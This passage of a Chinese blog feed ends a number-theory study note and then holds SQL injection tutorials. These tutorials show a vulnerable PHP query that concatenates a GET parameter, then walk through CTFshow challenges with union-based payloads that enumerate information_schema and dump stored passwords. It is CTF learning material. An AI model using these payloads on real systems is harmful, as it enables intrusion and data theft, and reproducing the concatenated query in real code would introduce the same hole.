title="推论3:"></a>推论3:</h4><p>设a,b,c是整数，若(a,c)&#x3D;1，(b,c)&#x3D;1，则(ab,c)&#x3D;1</p><h4 id="推论4"><a href="#推论4" class="headerlink" title="推论4:"></a>推论4:</h4><p>设a1,a2,……,an是整数,p是素数,p|a1a2……an，则p|某个a。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>证明方法略，贝祖定理和反证法即可完成所有。<br>这部分也是这节课主要理解难度所在，看起来杂乱繁琐，但是形散而神不散。<br><strong>概括：一个数被拆成乘积形式，素数是其基本组成部分。</strong></p><blockquote><ul><li><strong>发现了吗，这个规律就是下一部分的算术基本定理！！！</strong><br><strong>理解到位，很自然地就过渡到了下一部分，到此为止这章内容的线索也就很明显了。</strong></li></ul></blockquote><h2 id="思考题及其证明"><a href="#思考题及其证明" class="headerlink" title="思考题及其证明"></a>思考题及其证明</h2><p><img src="/dong.github/images/0916-7.png"><br>分类讨论:<br>若c是素数，由推论2，ab必然有一个被c整除。<br>若c非素数，举个反例,12&#x3D;3*4，6|12<br><img src="/dong.github/images/0916-9.png"><br>1.根据gcd性质,公因数一定小于等于最大公因数<br>2.由题:n|(a+b)(a-b),那么由推论1反证即可。<br><img src="/dong.github/images/0916-8.png"><br>1.根据有理数的性质：有理数可以被表示成分数，构造即可。<br>2.由上述互素的gcd性质可以知道:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mo stretchy="false">(</mo><msup><mi>m</mi><mi>k</mi></msup><mo separator="true">,</mo><msup><mi>n</mi><mi>k</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(m,n)=1 \iff (m^k,n^k)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6684em;vertical-align:-0.024em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span><br>那么结合最大公因数的性质（图中框出的那条），即可得证。</p><h1 id="重要定理及证明-lcm部分"><a href="#重要定理及证明-lcm部分" class="headerlink" title="重要定理及证明(lcm部分)"></a>重要定理及证明(lcm部分)</h1><p><img src="/dong.github/images/0916-10.png"></p><h2 id="定理1-19"><a href="#定理1-19" class="headerlink" title="定理1.19:"></a>定理1.19:</h2><p>设a,b是两个互素的正整数，则：<br>(1)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mo separator="true">,</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">a|m,b|m \implies ab|m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ab</span><span class="mord">∣</span><span class="mord mathnormal">m</span></span></span></span><br>(2)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">[a,b]=ab</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span></span></span></span></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-04f2787c" role="button" aria-expanded="false" aria-controls="collapse-04f2787c">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-04f2787c">        <div class="fold-content">          <p><img src="/dong.github/images/0916-11.png"></p>        </div>      </div>    </div><h2 id="定理1-20"><a href="#定理1-20" class="headerlink" title="定理1.20:"></a>定理1.20:</h2><p>(1)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mo separator="true">,</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">a|m,b|m \implies [a,b]|m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mord">∣</span><span class="mord mathnormal">m</span></span></span></span><br>(2)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>b</mi><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[a,b]=ab/(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ab</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-1fe6d199" role="button" aria-expanded="false" aria-controls="collapse-1fe6d199">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-1fe6d199">        <div class="fold-content">          <p><img src="/dong.github/images/0916-12.png"></p>        </div>      </div>    </div><h2 id="算术基本定理"><a href="#算术基本定理" class="headerlink" title="算术基本定理:"></a>算术基本定理:</h2><p><img src="/dong.github/images/0916-13.png"></p><h2 id="标准分解式"><a href="#标准分解式" class="headerlink" title="标准分解式:"></a>标准分解式:</h2><p><img src="/dong.github/images/0916-14.png"></p><h2 id="标准分解式的应用"><a href="#标准分解式的应用" class="headerlink" title="标准分解式的应用:"></a>标准分解式的应用:</h2><h3 id="判断整除"><a href="#判断整除" class="headerlink" title="判断整除"></a>判断整除</h3><p><img src="/dong.github/images/0916-15.png"></p><h3 id="求因数个数"><a href="#求因数个数" class="headerlink" title="求因数个数"></a>求因数个数</h3><p><img src="/dong.github/images/0916-16.png"></p><h3 id="求gcd和lcm"><a href="#求gcd和lcm" class="headerlink" title="求gcd和lcm"></a>求gcd和lcm</h3><p><img src="/dong.github/images/0916-17.png"></p><h1 id="综合应用与总结"><a href="#综合应用与总结" class="headerlink" title="综合应用与总结:"></a>综合应用与总结:</h1><p>找了半天一年前的博客笔记，但是再也找不到了，有一些失落。<br>但还记得，那是梦开始的地方，如今时隔一年了，问题终于有了答案。<br>翻到了当时讨论出的AC代码：</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-72a1265a" role="button" aria-expanded="false" aria-controls="collapse-72a1265a">        <div class="fold-arrow">▶</div>已知gcd、lcm，求a和b      </div>      <div class="fold-collapse collapse" id="collapse-72a1265a">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> t,i;<br><span class="hljs-type">int</span> m,n,a,b;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=t;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-type">int</span> k=m/n;<span class="hljs-comment">//求出ab</span><br>    <span class="hljs-keyword">for</span>(a=<span class="hljs-number">1</span>;a&lt;=<span class="hljs-built_in">sqrt</span>(m/n);a++)&#123;<br>b=k/a;<br><span class="hljs-keyword">if</span>(max(a,b)==<span class="hljs-number">1</span> &amp;&amp; a*b==k)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>,a*n,b*n);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">while</span>(x!=y)&#123;<br><span class="hljs-keyword">if</span>(x&gt;y)<br>x=x-y;<br><span class="hljs-keyword">if</span>(x&lt;y)<br>y=y-x;<br>&#125;<br>i=x;<br><span class="hljs-keyword">return</span> i; &#125;<br></code></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>&#x3D;</mo><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mi>m</mi><mtext> </mtext><mi>n</mi><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mfrac><mi>a</mi><mi>n</mi></mfrac><mfrac><mi>b</mi><mi>n</mi></mfrac><mo>&#x3D;</mo><mfrac><mi>m</mi><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex"><br>ab&#x3D;<a href="a,b">a,b</a>&#x3D;m,n<br>\iff \frac{a}{n} \frac{b}{n} &#x3D; \frac{m}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2251em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br>什么意思呢？公式两边除以n平方，那么根据这条定理:<br><img src="/dong.github/images/0916-18.png"><br>只需要枚举找到这两个互素的数就可以找到a,b了，大大减少了循环次数，是不是很神奇。</p>        </div>      </div>    </div><p><strong>The End.</strong></p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>王鑫教授的课件<br>《信息安全数学基础》(任伟)<br><a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">维基百科-欧几里得算法</a><br><a href="https://blog.junyu33.me/2024/09/13/exgcd">OI选手现充|junyu33博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>信息安全数学基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Math</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/dong.github/2024/09/01/sqlinjection/"/>
    <url>/dong.github/2024/09/01/sqlinjection/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL注入原理及注入基础。</strong></p><span id="more"></span><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><strong>SQL</strong></h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote><p>在计算机中存储数据，不仅要考虑如何将数据结构化地存储，更高效地利存储空间，还要考虑如何快速增、删、改、查，因此，SQL应运而生。</p></blockquote><p>SQL（Structured Query Language）是一种特殊目的的编程语言，用于管理和操作关系数据库系统。它允许用户定义、查询、更新和管理数据库中的数据。SQL 是大多数数据库系统的标准语言，包括 MySQL、PostgreSQL、SQLite、Oracle、SQL Server 等。</p><p><strong>也就是说，MySQL是数据库软件，而SQL是使用这类软件的一种通用编程语言。</strong></p><h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a><strong>SQL语句</strong></h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employees (  <br>    EmployeeID <span class="hljs-type">int</span>,  <br>    LastName <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),  <br>    FirstName <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),  <br>    Position <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)  <br>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Employees (EmployeeID, LastName, FirstName, Position)  <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Smith&#x27;</span>, <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-string">&#x27;Software Engineer&#x27;</span>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询数据<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Employees;<br>或者<br><span class="hljs-keyword">SELECT</span> FirstName, LastName <span class="hljs-keyword">FROM</span> Employees <span class="hljs-keyword">WHERE</span> Position <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Software Engineer&#x27;</span>;<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>更新数据<br><span class="hljs-keyword">UPDATE</span> Employees <span class="hljs-keyword">SET</span> Position <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Senior Software Engineer&#x27;</span> <span class="hljs-keyword">WHERE</span> EmployeeID <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除数据<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Employees <span class="hljs-keyword">WHERE</span> EmployeeID <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建索引<br><span class="hljs-keyword">CREATE</span> INDEX idx_lastname <span class="hljs-keyword">ON</span> Employees(LastName);<br><br></code></pre></td></tr></table></figure><h2 id="实际编程中的SQL"><a href="#实际编程中的SQL" class="headerlink" title="实际编程中的SQL"></a>实际编程中的SQL</h2><p>在实际编程中，通过创建与数据库管理软件的接口，实现对数据库的管理。由此，出现了SQL注入这样的漏洞：<br>例如这样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where  id = &#x27;.<span class="hljs-subst">$_GET</span>[&#x27;id&#x27;].&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>通过改变用GET方式传递的参数，使得单引号提前闭合，再将后边的内容注释掉，就可以实现一条完整的SQL语句，而这次查询的内容却可以被客户端控制。</strong></p><p>例如，id&#x3D;1时，查询结果正常，返回一条结果。<br>而id&#x3D;1’ or 1&#x3D;1 –+时，返回了所有数据，这时的查询语句变成了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where  id = 1 or 1=1;&quot;</span><br>即<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where 所有数据&quot;</span><br></code></pre></td></tr></table></figure><p>通过了解数据库的结构，可以在数据库中查到所需的数据。<br>这里通过Navicat Premium的图形界面，展示一个标准的数据库的结构：</p><p><img src="/dong.github/%5Cimages%5C0901-2.png" alt="image.png"></p><p>MySQL一经创建，就存在了information_schema、mysql、performance_schema、sys这几个库，类似默认文件，它们存储着整个数据库所有的重要信息，库名、表名、列名等等，SQL注入通常从这里下手，根据得到的信息不断深入，锁定所需的信息位置，最后获取数据。<br><img src="/dong.github/images/0901-1.png" alt="image1.png"><br><img src="/dong.github/images/0901-2.png" alt="image2.png"></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h1><h2 id="典型查找流程：爆库名-爆表名-爆字段名（列名）-查询"><a href="#典型查找流程：爆库名-爆表名-爆字段名（列名）-查询" class="headerlink" title="典型查找流程：爆库名-爆表名-爆字段名（列名）-查询"></a><strong>典型查找流程：爆库名-爆表名-爆字段名（列名）-查询</strong></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1&#x27; or 1=1 union select 1,2,database()--+<br><br>1&#x27; or 1=1 union select 1,2,group<span class="hljs-emphasis">_concat(table_</span>name) from information<span class="hljs-emphasis">_schema.tables where table_</span>schema=&#x27;ctfshow<span class="hljs-emphasis">_web&#x27;--+</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">1&#x27; or 1=1 union select 1,2,group_</span>concat(column<span class="hljs-emphasis">_name) from information_</span>schema.columns where table<span class="hljs-emphasis">_schema=&#x27;ctfshow_</span>web&#x27; and table<span class="hljs-emphasis">_name=&#x27;ctfshow_</span>user2&#x27;--+<br><br>-1&#x27; or 1=1 union select 1,group<span class="hljs-emphasis">_concat(column_</span>name) from information<span class="hljs-emphasis">_schema.columns where table_</span>schema=&#x27;ctfshow<span class="hljs-emphasis">_web &#x27;--+</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">1&#x27; or 1=1 union select 1,2,group_</span>concat(password) from ctfshow<span class="hljs-emphasis">_user2--+</span><br><span class="hljs-emphasis"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入-无过滤注入</title>
    <link href="/dong.github/2024/09/01/sqlinjection1/"/>
    <url>/dong.github/2024/09/01/sqlinjection1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL无过滤注入CTFshow171-175</strong></p><span id="more"></span><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,database() --+寻找当前库名</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+寻找所有库名</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;--+寻找表名 </span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctfshow_web &#x27;</span><span class="hljs-comment">--+寻找列名</span><br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(password) from ctfshow_user2--+寻找flag</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><blockquote><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul><li>group_concat()将查询结果打包在一起返回，便于观察</li><li>–+表示将之后的内容注释掉，以及其他一些方式注释掉之后内容</li><li>使用union select需要让前边语句结果为假(-1’)，或者添加’1&#x3D;1’</li></ul></blockquote><h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="CTFShow174："><a href="#CTFShow174：" class="headerlink" title="CTFShow174："></a>CTFShow174：</h2><p><img src="/dong.github/images/0901-5.png" alt="alt text"></p><h2 